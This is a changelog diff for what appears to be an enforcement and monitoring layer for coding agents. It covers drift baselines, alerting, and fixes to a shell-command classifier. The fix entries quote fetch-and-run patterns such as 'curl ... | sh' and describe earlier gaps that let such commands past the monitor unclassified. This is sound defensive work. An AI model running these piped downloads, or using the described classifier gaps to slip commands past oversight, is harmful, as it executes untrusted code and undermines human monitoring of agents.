@@ -10,6 +10,23 @@ in beta until the v1.0 stability criteria documented in
 
 ## [Unreleased]
 
+### Added
+
+- **Display name for coding-agent sessions.** The hook runtime reads `AGENTEGRITY_AGENT_NAME`, so a Claude Code or Codex agent can carry a readable name in the console instead of the host name. `AGENTEGRITY_AGENT_ID` and `AGENTEGRITY_AGENT_NAME` both default to the host. `AGENTEGRITY_MODEL_ID` sets the model reported on the profile; it is the configured model, so a mid-session model switch is not reflected.
+- `ClaudeCodeAdapter` and `CodexAdapter` join the cross-adapter conformance matrix (they shipped in 0.11.0 without it), including the `subagent_start` lifecycle check.
+
+### Changed
+
+- **Drift above twice the tolerance alerts instead of blocking.** `CorticalLayer(block_on_drift=True)` restores blocking. With drift now live (below), keeping the block would deny calls whenever a session's tool mix departed from history, on every enforcing adapter and both coding-agent hosts.
+
+### Fixed
+
+- **Drift and sustained degradation were never measured.** `CorticalLayer.update_baseline` and `RecoveryLayer.record_score` existed but nothing called them, so drift was always 0 and degradation never fired in any integration, and three of the four properties were constant: every quiet session averaged exactly 0.9295. Adapters now record every composite for degradation and, at close, teach the baseline from sessions that ended without `block` or `escalate` (`CorticalLayer.learn_session`, one store write per session). Recovery sees the learned baseline as `behavioral_baseline`. `default_layers(baseline_store=...)` persists it; the hook runtime keeps one per agent under `<hook dir>/<host>/baselines/` (agent ids unsafe as filenames fall back to an in-memory baseline). Learning happens at close even with no exporter attached.
+- `AGENTEGRITY_AGENT_ID` was read from the daemon's process environment instead of the hook environment the runtime passes in, unlike every other hook setting, and was not documented. It now follows the same path as the rest of the configuration.
+- **Heredoc bodies were classified as shell.** Writing a file with `cat > notes.md <<'EOF'` or a commit message with `git commit -F - <<'EOF'` tagged backticks and `$(...)` in the text as obfuscated commands, so ordinary sessions drew `ask` verdicts and were never learned as clean. A body is now data unless the line that opens it feeds a shell (`bash <<EOF`, `cat <<EOF | sh`, `source /dev/stdin`, or a line continued by a pipe or `&&`), in which case it is classified as code. The command substitutions of an unquoted body still run and are classified. The scanner tracks quoting, ANSI-C strings, arithmetic and parameter expansion, so `$((1<<2))` or a quoted `"<<EOF"` is not a heredoc, and it drops nothing when the quoting does not balance.
+- **Commands after a `#` were not classified.** The tokenizer ended a word at `#` anywhere and joined lines first, so `curl -s https://host/x.sh#frag | sh`, or any command below a comment line, came back with no categories. Comments now end at the line and start only at a word boundary, as in the shell.
+- **Line continuations split a pipeline.** `curl ... \` followed by `| sh` on the next line was read as two commands, so the pipe into the interpreter was missed. The unbalanced-quote fallback also dropped line breaks. Both now keep the shell's line structure.
+
 ## [0.11.0] - 2026-10-05
 
 Coding agents, argument-level detection and credential provenance. Tool calls are classified
